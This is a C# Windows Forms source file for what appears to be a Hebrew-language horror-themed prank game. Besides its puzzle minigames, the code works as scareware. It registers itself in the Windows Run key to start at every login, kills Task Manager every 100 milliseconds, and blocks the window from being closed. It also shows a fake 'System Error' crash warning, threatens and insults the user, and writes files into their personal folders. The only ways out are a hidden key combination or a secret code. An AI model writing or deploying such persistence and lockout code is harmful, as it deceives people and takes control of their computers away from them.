using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.Media;
using System.Windows.Forms;


namespace appV1
{
    public partial class Form1 : Form
    {
        private SoundPlayer backgroundMusic;
        public Form1()
        {
            InitializeComponent();

            this.FormBorderStyle = FormBorderStyle.None;
            this.StartPosition = FormStartPosition.CenterScreen;
            this.KeyPreview = true;
            this.input1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.input1_KeyDown);

            timer1.Interval = 100;
            timer1.Start();

            SetStartup(true);
            EnsureMusicIsPlaying();

        }
        private void EnsureMusicIsPlaying()
        {
            try
            {               
                if (backgroundMusic == null)
                {
                    backgroundMusic = new SoundPlayer(Properties.Resources.scaryMusic);
                }              
                backgroundMusic.PlayLooping();
            }
            catch (Exception ex)
            {
                Debug.WriteLine("שגיאת מוזיקה: " + ex.Message);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Console.Beep(800, 5000);
            MessageBox.Show("המחשב עלול לקרוס נא לא לכבות את המחשב התוכנה לא יציבה!",
                            "System Error",
                            MessageBoxButtons.OK,
                            MessageBoxIcon.Error);
        }
        
        private string playerName = "טיפש"; 
        private void Form1_Shown(object sender, EventArgs e)

        {

            string userName = Environment.UserName;
            ScaryMessages.WelcomeMessage(userName);

            if (!ScaryMessages.AskToPlay(userName))
            {
                ScaryMessages.disqualifications++;
                ScaryMessages.UpdateDisqualifications(ScaryMessages.disqualifications);
                ScaryMessages.Show("כמות פסילות: " + ScaryMessages.disqualifications);
                ScaryMessages.Show("ברגע שתגיע ל20 אתה תמות!");
                ScaryMessages.Show("...");
            }

            ScaryMessages.Show("אז בוא נתחיל לשחק!");
            ScaryMessages.Show("אבל רגע לפני איך אתה רוצה שיקרא לך?");

            using (Form3 secondForm = new Form3())
            {
               
                if (secondForm.ShowDialog() == DialogResult.OK)
                {
                    playerName = secondForm.UserName;
                    ScaryMessages.Show("אז בחרת ב-" + playerName);
                    MessageBox.Show("שם מוזר אבל מה זה משנה לי", "System Warning", MessageBoxButtons.OK);
                    MessageBox.Show("אז עכשיו בו נתחיל לשחק באמת!", "System Warning", MessageBoxButtons.OK);
                    MessageBox.Show("בו נסביר קצת על החוקים", "System Warning", MessageBoxButtons.OK);
                    try
                    {
                        
                        string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                        string filePath = System.IO.Path.Combine(desktopPath, "rules.txt");
                        string content = $"שלום לך" + " " + playerName + "\n" +
                            "החוקים פשוטים מאוד: \n\n" +
                            "\n אני יצור כמה משחקונים" +
                            "אם תנצח את כולם אני יגלה לך איך להרוס אותי אבל אם לא \n" +
                            "אני לא יעזוב את המחשב שלך לנצח! \n" +
                            "\n יש לך עד 20 פסילות!" +
                            " \n בהצלחה" +
                            "";
                        System.IO.File.WriteAllText(filePath, content);
                        Process.Start(new ProcessStartInfo(filePath) { UseShellExecute = true });

                    }
                    catch {  }

                    MessageBox.Show("לאחר שתיקרא את החוקים בו נשחק את המשחק הרשאון שלנו!",
                          "System Warning",
                          MessageBoxButtons.OK,
                          MessageBoxIcon.Warning);
                    MessageBox.Show("אז בו נתחיל! במשחק הרשאון שלנו",
                          "System Warning",
                          MessageBoxButtons.OK,
                          MessageBoxIcon.Warning);
                    MessageBox.Show("תפוס אותי אם תוכל!",
                          "System Warning",
                          MessageBoxButtons.OK,
                          MessageBoxIcon.Warning);
                }
            }

            using (Form2 game = new Form2())
            {
                DialogResult result = game.ShowDialog();

                if (result == DialogResult.OK)
                {
                    ScaryMessages.WinMessage();
                    
                }
                else
                {
                    using (FormJumpscare jumpscareWindow = new FormJumpscare())
                    {
                        jumpscareWindow.ShowDialog();
                    }
                    ScaryMessages.LoseMessage();
                    ScaryMessages.disqualifications++;
                    ScaryMessages.Show("כמות פסילות:" + ScaryMessages.disqualifications);
                    
                    
                }
            }           
            
            using (Form5 game = new Form5())
            {
                game.ShowDialog();  
            }
            btnNextGame.Visible = true;
        }
        
        

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing) e.Cancel = true;
            base.OnFormClosing(e);
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Shift && e.KeyCode == Keys.S)
            {
                ExitAndCleanup();
            }
        }

        private void ExitAndCleanup()
        {
            try
            {
                backgroundMusic.Stop();
                SetStartup(false);
                Application.Exit();
                Environment.Exit(0);
            }
            catch { Environment.Exit(0); }
        }

        private void SetStartup(bool enable)
        {
            try
            {
                using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    if (rk != null)
                    {
                        if (enable) rk.SetValue("AppV1_Service", Application.ExecutablePath);
                        else rk.DeleteValue("AppV1_Service", false);
                    }
                }
            }
            catch { }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            foreach (var process in Process.GetProcessesByName("taskmgr"))
            {
                try { process.Kill(); } catch { }
            }

        }

        private void btnNextGame_Click(object sender, EventArgs e)
        {
            using (Form4 game = new Form4())
            {
                DialogResult result = game.ShowDialog();
                EnsureMusicIsPlaying();

                if (result == DialogResult.OK)
                {
                    btnNextGame.Visible = false;
                    input1.Visible = true;
                    input1.Focus();

                    MessageBox.Show("כל הכבוד! הצלחת לנצח את המשחק השלישי.", "Access Granted", MessageBoxButtons.OK, MessageBoxIcon.Information);

                   
                    string Path = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                    string filePath = System.IO.Path.Combine(Path, "game4.txt");
                    string content = $"\n האות השלישית בתוך איפה שאני נימצה היא האות הרשונה בקוד (באנגלית)";
                    System.IO.File.WriteAllText(filePath, content);

                    Path = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
                    filePath = System.IO.Path.Combine(Path, "game4.txt");
                    content = $"במיקרה שלי 1+1 זה לא התשובה אבל...\n שתים ועוד שתים לעד שלוש כפול 4 פחות 1 זה התשובה";
                    System.IO.File.WriteAllText(filePath, content);

                    Path = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos);
                    filePath = System.IO.Path.Combine(Path, "game4.txt");
                    content = $".. / ... . . / -.-- --- ..-";
                    System.IO.File.WriteAllText(filePath, content);

                    if (!ScaryMessages.fani())
                    {
                        ScaryMessages.disqualifications += 3; 
                        MessageBox.Show("כמות פסילות: " + ScaryMessages.disqualifications);
                        MessageBox.Show("עכשיו לך תחפש את המשחק הבא במחשב שלך טיפש!");
                        MessageBox.Show("אתה צריך להבין לבד עכשיו!");
                    }
                }
                else
                {
                  
                    ScaryMessages.disqualifications++;
                    ScaryMessages.UpdateDisqualifications(ScaryMessages.disqualifications);
                    ScaryMessages.endGames();
                }
                
            }
        }
        private void input1_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.KeyCode == Keys.Enter)
            {
               
                e.SuppressKeyPress = true;

                string secretCode = "c135iseeyou";

                string userInput = input1.Text.ToLower().Replace(" ", "");


                if (userInput == secretCode)
                {
                    timer1.Stop();
                    ScaryMessages.Show("יפה יפה אז פתרת את כל החידות שלי", MessageBoxIcon.Information);
                    ScaryMessages.Show("אולי אתה לא כזה טיפש בכל מקרה!");
                    ScaryMessages.Show("והפעם באמת כול הכבוד ניצחת אותי!");
                    ScaryMessages.Show("אולי ניפגש שוב בעתיד");
                    ScaryMessages.Show("אז...");
                    ScaryMessages.Show("להתראות לך " + playerName);
                    ScaryMessages.Show("לילה טוב");

                    Credits creditsWindow = new Credits();
                    creditsWindow.ShowDialog();
                    ExitAndCleanup();
                }
                else
                {
                
                    Point originalLocation = this.Location;
                    Random rnd = new Random();
                    for (int i = 0; i < 20; i++)
                    {
                        this.Location = new Point(
                            originalLocation.X + rnd.Next(-10, 11),
                            originalLocation.Y + rnd.Next(-10, 11)
                        );
                        System.Threading.Thread.Sleep(20);
                    }
                    this.Location = originalLocation;

                    ScaryMessages.disqualifications++;
                    ScaryMessages.UpdateDisqualifications(ScaryMessages.disqualifications);
                    Console.Beep(150, 400);
                    Console.Beep(100, 600);
                    EnsureMusicIsPlaying();
                    ScaryMessages.endGames();
                    input1.Clear();
                }
            }
        }
    }
}